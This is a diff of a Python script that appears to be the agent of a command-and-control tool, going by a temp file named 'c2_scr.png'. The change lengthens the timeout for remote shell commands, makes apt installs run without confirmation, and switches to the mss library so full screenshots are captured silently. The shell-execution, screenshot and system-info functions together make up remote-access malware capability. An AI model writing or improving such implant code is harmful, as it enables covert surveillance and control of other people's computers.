@@ -4,14 +4,15 @@ import subprocess
 import platform
 import socket
 import os
-import io
 import sys
-
+import mss, mss.tools
 
 def run_shell(command):
+    if command.strip().startswith("apt"):
+        command = f"DEBIAN_FRONTEND=noninteractive {command}" #pour un apt install par ex ca demande une confirmation donc on force sans confirm
     result = subprocess.run(
         command, shell=True,
-        capture_output=True, text=True, timeout=30
+        capture_output=True, text=True, timeout=120
     )
     return {
         "status": "ok",
@@ -21,14 +22,9 @@ def run_shell(command):
 
 
 def take_screenshot():
-    tmp = "/tmp/c2_scr.png"
-    result = subprocess.run(["scrot", tmp], capture_output=True)
-    if result.returncode != 0:
-        raise RuntimeError("scrot a échoué — installer avec: apt install scrot")
-    with open(tmp, "rb") as f:
-        data = f.read()
-    os.remove(tmp)
-    return data
+    with mss.mss() as sct:
+        shot = sct.grab(sct.monitors[0])
+        return mss.tools.to_png(shot.rgb, shot.size)
 
 
 def get_sysinfo():
